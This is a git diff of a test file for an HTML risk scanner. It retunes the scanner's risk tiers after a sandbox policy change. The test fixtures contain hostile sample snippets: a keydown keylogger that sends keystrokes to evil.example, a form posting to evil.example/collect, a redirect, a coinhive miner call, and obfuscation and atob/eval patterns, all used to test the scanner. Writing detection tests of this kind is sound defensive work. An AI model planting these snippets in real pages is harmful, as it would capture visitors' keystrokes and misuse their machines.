@@ -101,17 +101,21 @@ describe('htmlSecurity', () => {
       expect(result.tier).toBe(RISK_TIER.FLAGGED)
     })
 
-    it('returns Tier 2 for obfuscated JS (heavy String.fromCharCode)', () => {
-      const html = '<script>' + 'String.fromCharCode(65);'.repeat(5) + '</script>'
+    it('returns Tier 2 for obfuscated JS (heavy String.fromCharCode, threshold 8+)', () => {
+      const html = '<script>' + 'String.fromCharCode(65);'.repeat(10) + '</script>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
       expect(result.findings.some((f) => f.category === 'obfuscation')).toBe(true)
     })
 
-    it('returns Tier 2 for page redirect patterns', () => {
+    it('returns Tier 1 for page redirect (sandbox blocks top-nav, informational only)', () => {
+      // Policy change 2026-05-03: window.location is sandbox-neutralized.
+      // The CSP runtime profile + iframe sandbox block top-navigation, so a
+      // redirect attempt cannot escape the iframe. Recorded as Tier 1
+      // informational, not Tier 2.
       const html = '<script>window.location.href = "https://evil.example";</script>'
       const result = classifyHtmlRisk(html)
-      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
+      expect(result.tier).toBe(RISK_TIER.FLAGGED)
       expect(result.findings.some((f) => f.category === 'redirect')).toBe(true)
     })
 
@@ -137,11 +141,16 @@ describe('htmlSecurity', () => {
       expect(result.findings.some((f) => f.category === 'keylogging')).toBe(false)
     })
 
-    it('returns Tier 2 for form exfiltration (non-sensitive fields)', () => {
+    it('returns Tier 1 for external form action with non-sensitive fields (sandbox blocks submission)', () => {
+      // Policy change 2026-05-03: an external form action without password
+      // or sensitive-name fields is sandbox-neutralized (CSP `form-action
+      // 'none'` blocks submission). Recorded as Tier 1 informational.
+      // External form + sensitive field still fires `credential-capture`
+      // (Tier 3) — that path is unchanged.
       const html =
         '<form action="https://evil.example/collect"><input name="query"><input name="email"></form>'
       const result = classifyHtmlRisk(html)
-      expect(result.tier).toBe(RISK_TIER.HIGH_RISK)
+      expect(result.tier).toBe(RISK_TIER.FLAGGED)
       expect(result.findings.some((f) => f.category === 'exfiltration')).toBe(true)
     })
 
@@ -176,29 +185,55 @@ describe('htmlSecurity', () => {
       expect(result.findings.some((f) => f.category === 'credential-capture')).toBe(true)
     })
 
-    it('returns Tier 3 for 3+ distinct high-risk behavior categories', () => {
+    it('returns Tier 3 for 3+ distinct high-risk behavior categories (Tier 1 informational excluded)', () => {
+      // Policy change 2026-05-03: only Tier 2 high-severity behaviors count
+      // toward the 3-category escalation. Tier 1 informational behaviors
+      // (redirect, exfiltration form) no longer drive Tier 3 escalation
+      // because the sandbox already neutralizes them. Three real high-risk
+      // categories: obfuscation, keylogging-with-network-exfil, crypto-miner.
       const html = [
         '<script>',
-        'String.fromCharCode(65);'.repeat(5), // obfuscation
-        'window.location.href = "https://evil.example";', // redirect
-        // Real keylogging: keydown handler that ships event.key out via fetch
-        'document.addEventListener("keydown", function(e) { fetch("https://evil.example/log", { method: "POST", body: e.key }); });',
+        'String.fromCharCode(65);'.repeat(10), // obfuscation (≥8 threshold)
+        'document.addEventListener("keydown", function(e) { fetch("https://evil.example/log", { method: "POST", body: e.key }); });', // keylogging
+        'coinhive.start();', // crypto-miner
         '</script>',
       ].join('\n')
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.QUARANTINED)
       const categories = new Set(result.findings.map((f) => f.category))
       expect(categories.has('obfuscation')).toBe(true)
-      expect(categories.has('redirect')).toBe(true)
       expect(categories.has('keylogging')).toBe(true)
+      expect(categories.has('crypto-miner')).toBe(true)
     })
 
     it('returns Tier 3 for obfuscated crypto-miner', () => {
-      const html = '<script>' + 'String.fromCharCode(65);'.repeat(5) + 'coinhive.start();</script>'
+      const html = '<script>' + 'String.fromCharCode(65);'.repeat(10) + 'coinhive.start();</script>'
       const result = classifyHtmlRisk(html)
       expect(result.tier).toBe(RISK_TIER.QUARANTINED)
       expect(result.findings.some((f) => f.category === 'crypto-miner')).toBe(true)
       expect(result.findings.some((f) => f.category === 'obfuscation')).toBe(true)
+    })
+
+    it('does NOT escalate fetch() + window.location to Tier 2 (both sandbox-neutralized)', () => {
+      // Regression guard for the 2026-05-03 scanner relaxation. A legit
+      // study sheet that calls a public API and redirects on submit must
+      // not get queued for human review.
+      const html =
+        '<script>fetch("/api/data").then(r => r.json()); window.location.href = "/results";</script>'
+      const result = classifyHtmlRisk(html)
+      expect(result.tier).toBe(RISK_TIER.FLAGGED)
+    })
+
+    it('escalates atob() and eval() to Tier 2 (canonical exploit primitives)', () => {
+      // atob is Tier 2 because it's the canonical first step of "decode
+      // an obfuscated payload then run it" — combined with eval/Function
+      // it's the standard malware-loader pattern. Founder may revisit
+      // if a benign use case (e.g. legit base64 image decoding in a
+      // study sheet) produces false positives.
+      const atobOnly = classifyHtmlRisk('<script>const data = atob("aGVsbG8=");</script>')
+      expect(atobOnly.tier).toBe(RISK_TIER.HIGH_RISK)
+      const evalOnly = classifyHtmlRisk('<script>eval("alert(1)");</script>')
+      expect(evalOnly.tier).toBe(RISK_TIER.HIGH_RISK)
     })
 
     it('includes a summary string', () => {
